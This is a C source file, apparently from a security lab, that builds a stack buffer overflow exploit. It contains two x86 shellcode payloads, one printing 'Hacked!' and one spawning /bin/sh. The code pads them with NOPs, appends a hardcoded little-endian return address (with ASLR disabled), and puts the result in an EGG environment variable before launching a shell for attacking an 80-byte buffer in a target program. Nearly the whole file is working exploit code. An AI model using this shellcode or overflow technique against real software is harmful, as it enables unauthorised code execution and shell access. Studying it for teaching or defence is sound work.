#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90

char hacked_code[] = "\xeb\x14"       // jmp    8048076 <_start+0x16>
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x04"                        // mov    $0x4,%al
    "\x31\xdb"                        // xor    %ebx,%ebx
    "\x43"                            // inc    %ebx
    "\x59"                            // pop    %ecx
    "\x31\xd2"                        // xor    %edx,%edx
    "\xb2\x07"                        // mov    $0x7,%dl
    "\xcd\x80"                        // int    $0x80
    "\x31\xc0"                        // xor    %eax,%eax
    "\xb0\x01"                        // mov    $0x1,%al
    "\xcd\x80"                        // int    $0x80
    "\xe8\xe7\xff\xff\xff"            // call   8048062 <_start+0x2>
    "Hacked!";

char short_shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
    "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
    "\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";


// address of buffer on system found to be - 0xffffcdcc (ASLR was disabled) 
// address changes every time a new terminal is opened.
// address is written in the Little Endian format

char retaddr[] = "\x3c\xcd\xff\xff";

int main(int argc, char **argv) {

    /**
        buffer (in the vulnerable program) is 80 bytes,
        so the stack looks like this
        ---------------------------------------------------------------------------
        | 80 bytes   | 4 bytes | 8 bytes  | 4 bytes | 4 bytes | 4 bytes | 4 bytes |
        | Buffer -   | int i - | Slack -  | EBP -   | RET -   | argc -  | argv -  |
        ---------------------------------------------------------------------------
        Find out what the slack is for!
        We will replace the contents of the stack from buffer 
        and overwrite the return address so that it points to 
        the address of buffer.
        ---------------------------------------------------------
        | Shellcode padded      | PTR to shell        | NULL    |
        | with NOP - 96 bytes   | code - 4 bytes      | 4 bytes |
        ---------------------------------------------------------
    **/
    
    char buffer[108];
    // fill the buffer with NOP instructions
    memset(buffer, NOP, sizeof(buffer));
    printf("Buffer: %s\n", buffer);
    // set the first 4 bytes to EGG=
    memcpy(buffer, "EGG=", 4);
    printf("Buffer: %s\n", buffer);
    // set shellcode to EGG
    switch(argv[1][0]) {
        case '1': 
            printf("Size of shellcode: %d\n", strlen(hacked_code));
            memcpy(buffer+4, hacked_code, strlen(hacked_code));
            break;
        default: 
            printf("Size of shellcode: %d\n", strlen(short_shellcode));
            memcpy(buffer+4, short_shellcode, strlen(short_shellcode));
    }
    printf("Buffer: %s\n", buffer);
    // fill the return address which from 88
    memcpy(buffer+100, retaddr, 4);
    printf("Buffer: %s\n", buffer);
    // fill NULL at the end of the shellcode
    memcpy(buffer+104, "\x00\x00\x00\x00", 4);
    printf("Buffer: %s\n", buffer);

    putenv(buffer);

    system("/bin/sh");

    return 0;
}
